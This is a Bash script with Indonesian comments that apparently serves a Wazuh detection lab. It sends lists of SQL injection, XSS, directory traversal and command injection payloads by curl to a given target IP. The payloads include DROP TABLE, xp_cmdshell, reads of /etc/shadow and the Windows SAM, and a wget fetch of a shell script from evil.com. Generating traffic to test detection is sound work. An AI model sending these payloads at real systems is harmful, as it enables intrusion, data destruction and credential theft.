#!/bin/bash
# ===================================================
# Simulasi Web Attack (SQL Injection & XSS)
# Jalankan di Agent 2 (perlu Apache terinstall)
# ===================================================
# Usage: bash attack-web.sh <TARGET_IP>
# ===================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${RED}=================================================${NC}"
echo -e "${RED}   SIMULASI: WEB ATTACK (SQLi & XSS)             ${NC}"
echo -e "${RED}=================================================${NC}"
echo ""
echo -e "${YELLOW}[WARNING] Ini hanya simulasi untuk tujuan edukasi!${NC}"
echo ""

TARGET_IP="${1:-localhost}"

echo -e "${GREEN}[INFO] Target: http://${TARGET_IP}${NC}"
echo ""

# Cek Apache
echo -e "${YELLOW}[PREP] Checking Apache...${NC}"
if ! command -v apache2 &> /dev/null && ! systemctl is-active apache2 &> /dev/null; then
    echo -e "${YELLOW}  Apache belum terinstall. Installing...${NC}"
    sudo apt install -y apache2
    sudo systemctl start apache2
fi
echo -e "${GREEN}  Apache is running${NC}"
echo ""

# ====== SQL INJECTION ATTACKS ======
echo -e "${YELLOW}[1/4] SQL Injection Attacks...${NC}"

SQL_PAYLOADS=(
    "/index.html?id=1' OR '1'='1"
    "/login?user=admin'--"
    "/search?q=1 UNION SELECT * FROM users--"
    "/page?id=1; DROP TABLE users;--"
    "/product?id=1' AND 1=1--"
    "/api?param=' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--"
    "/admin?id=1' OR 1=1; --"
    "/data?q=SELECT * FROM credentials WHERE 1=1"
    "/view?file=1'; EXEC xp_cmdshell('whoami');--"
    "/query?search=' UNION SELECT username,password FROM admin--"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    echo -e "  ${RED}→${NC} SQLi: ${payload}"
    curl -s -o /dev/null "http://${TARGET_IP}${payload}" 2>/dev/null
    sleep 0.5
done

echo -e "${GREEN}  [DONE] ${#SQL_PAYLOADS[@]} SQL injection attempts sent${NC}"
echo ""

# ====== XSS ATTACKS ======
echo -e "${YELLOW}[2/4] XSS (Cross-Site Scripting) Attacks...${NC}"

XSS_PAYLOADS=(
    "/search?q=<script>alert('XSS')</script>"
    "/page?name=<img src=x onerror=alert(1)>"
    "/comment?text=<svg/onload=alert('hacked')>"
    "/input?data=<iframe src='javascript:alert(1)'>"
    "/form?field=<body onload=alert('XSS')>"
    "/profile?bio=<script>document.cookie</script>"
    "/msg?text=<marquee onstart=alert('xss')>"
    "/search?q=\"><script>alert(String.fromCharCode(88,83,83))</script>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo -e "  ${RED}→${NC} XSS: ${payload}"
    curl -s -o /dev/null "http://${TARGET_IP}${payload}" 2>/dev/null
    sleep 0.5
done

echo -e "${GREEN}  [DONE] ${#XSS_PAYLOADS[@]} XSS attempts sent${NC}"
echo ""

# ====== DIRECTORY TRAVERSAL ======
echo -e "${YELLOW}[3/4] Directory Traversal Attacks...${NC}"

TRAVERSAL_PAYLOADS=(
    "/page?file=../../../etc/passwd"
    "/download?path=....//....//etc/shadow"
    "/include?page=..%2F..%2F..%2Fetc%2Fpasswd"
    "/view?doc=....\\....\\windows\\system32\\config\\sam"
    "/read?f=/etc/passwd"
    "/load?path=..%252f..%252f..%252fetc%252fpasswd"
)

for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    echo -e "  ${RED}→${NC} Traversal: ${payload}"
    curl -s -o /dev/null "http://${TARGET_IP}${payload}" 2>/dev/null
    sleep 0.5
done

echo -e "${GREEN}  [DONE] ${#TRAVERSAL_PAYLOADS[@]} traversal attempts sent${NC}"
echo ""

# ====== COMMAND INJECTION ======
echo -e "${YELLOW}[4/4] Command Injection Attacks...${NC}"

CMD_PAYLOADS=(
    "/exec?cmd=;cat /etc/passwd"
    "/ping?host=;id"
    "/run?command=|whoami"
    "/shell?input=\$(cat /etc/shadow)"
    "/process?action=;wget http://evil.com/shell.sh"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    echo -e "  ${RED}→${NC} CmdInj: ${payload}"
    curl -s -o /dev/null "http://${TARGET_IP}${payload}" 2>/dev/null
    sleep 0.5
done

echo -e "${GREEN}  [DONE] ${#CMD_PAYLOADS[@]} command injection attempts sent${NC}"
echo ""

echo -e "${RED}=================================================${NC}"
echo -e "${GREEN}SIMULASI WEB ATTACK SELESAI!${NC}"
echo ""
echo -e "Total attacks sent: $((${#SQL_PAYLOADS[@]} + ${#XSS_PAYLOADS[@]} + ${#TRAVERSAL_PAYLOADS[@]} + ${#CMD_PAYLOADS[@]}))"
echo ""
echo -e "${YELLOW}Cek Wazuh Dashboard:${NC}"
echo "  1. Login ke Dashboard"
echo "  2. Buka Security Events"
echo "  3. Filter: rule.groups: web OR rule.groups: attack"
echo "  4. Lihat alert web attack yang muncul"
echo -e "${RED}=================================================${NC}"
